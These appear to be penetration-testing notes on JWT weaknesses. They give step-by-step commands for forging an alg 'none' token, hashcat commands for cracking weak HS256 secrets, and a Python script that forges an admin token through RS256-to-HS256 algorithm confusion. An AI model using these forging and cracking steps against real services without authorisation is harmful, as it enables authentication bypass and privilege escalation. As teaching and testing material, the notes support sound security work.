# JWT flaw

JWTs are self-contained tokens that can be used to securely transmit session information. It is an [open standard](https://tools.ietf.org/html/rfc7519), providing information for any developer or library creator who wants to use JWTs.&#x20;

A JWT consists of three components, each Base64Url encoded and separated by dots:

* **Header** - The header usually indicates the type of token, which is JWT, as well as the signing algorithm that is used.
* **Payload** - The payload is the body of the token, which contain the claims. A claim is a piece of information provided for a specific entity. In JWTs, there are registered claims, which are claims predefined by the JWT standard and public or private claims. The public and private claims are those which are defined by the developer. It is worth knowing the difference between public and private claims, but not for security purposes, hence this will not be our focus in this room.
* **Signature** - The signature is the part of the token that provides a method for verifying the token's authenticity. The signature is created by using the algorithm specified in the header of the JWT. Let's dive a bit into the main signing algorithms.



## Signature Validation Flaws

### Sensitive Information Disclosure

A common issue is the exposure of sensitive information within the JWT such as:

* **Credential disclosure** with the password hash, or even worse, the clear-text password being sent as a claim.
* Exposure of **internal network information** such as the private IP or hostname of the authentication server.





### None Algorithm

A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

1. Modify the header section of the token so that the `alg` header would contain the value `none`.
2. Remove the signature part.
3. Make a new request with None Alg JWT\


Test this to all API to find a endpoint without correct authentication.

{% embed url="https://www.gavinjl.me/edit-jwt-online-alg-none/" %}



<details>

<summary>Change JWT alg in linux machine</summary>

Start with the encoded token:

{% code overflow="wrap" %}
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```
{% endcode %}

Split the encoded token into segments delimited by the "." character.

\
The first block is the header, decode that:

```bash
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
```

Here, the result is:

```
{"alg":"HS256","typ":"JWT"}
```

You can manually edit this and alter the algorithm, here we're changing it to "none". Once changed we can base64 encode it again to become useable:

```bash
echo -n '{"alg":"none","typ":"JWT"}' | base64
```

The result of that is :

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
```

{% hint style="info" %}
IMPORTANT: Remove the trailing "=" before we use it to replace the first part of the JWT.
{% endhint %}

Follow the same process to edit the JWT payload (second encoded block).

{% code overflow="wrap" %}
```bash
echo 'eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ' | base64 -d
```
{% endcode %}

Result:

```json
{"sub":"1234567890","name":"John Doe","iat":1516239022}
```

We'll edit the name from John Doe to be Jane Doe and encode it:

```bash
echo -n '{"sub":"1234567890","name":"Jane Doe","iat":1516239022}' | base64
```

Result:

```
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphbmUgRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ==
```

If we're setting the algorithm to "none" then we don't want a signature. The format we'll get is:

```
{encoded header}.{encoded payload}.
```

Note the "." on the end. This would normally have the signature after it but because we're saying the algorithm is none then no signature is needed.

Our example becomes:

{% code overflow="wrap" %}
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphbmUgRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```
{% endcode %}

We've successfully edited a JWT and can test to see if the server accepts the edited version.

</details>



### Weak Symmetric Secrets

If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. **If a weak secret is used**, it may be possible to perform offline cracking to recover the secret. Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.

1. Save the JWT to a text file called `jwt.txt`.
2. Download a common JWT secret list. For this room, you can use `wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list` to download such a list.
3. Use Hashcat to crack the secret using `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`&#x20;

Once you know what the secret is, you can forge a new admin token.



### Signature Algorithm Confusion

The last common issue with signature validation is when an algorithm confusion attack can be performed. This is similar to the `None` downgrade attack, however, it specifically happens with confusion between symmetric and asymmetric signing algorithms. If an asymmetric signing algorithm, for example, RS256 is used, it may be possible to downgrade the algorithm to HS256. In these cases, some libraries would default back to using the public key as the secret for the symmetric signing algorithm. Since the public key can be known, you can forge a valid signature by using the HS256 algorithm in combination with the public key.

{% code title="Python code to forge" %}
```python
import jwt

public_key = "ADD_KEY_HERE"

payload = {
    'username' : 'user',
    'admin' : 0 # change to elevate privileges
}

access_token = jwt.encode(payload, public_key, algorithm="HS256")
print (access_token)
```
{% endcode %}



## JWT Lifetimes

Ensure the `exp` value in JWTs allows tokens to expire appropriately, as they lack a built-in expiration feature like cookies. If early expiration is needed, maintain a blocklist of tokens. Use varying `exp` values for different applications, such as mail servers versus banking systems. Consider using refresh tokens for enhanced security. Research these aspects when testing APIs with JWTs.

An attacker could steal olden token still active.

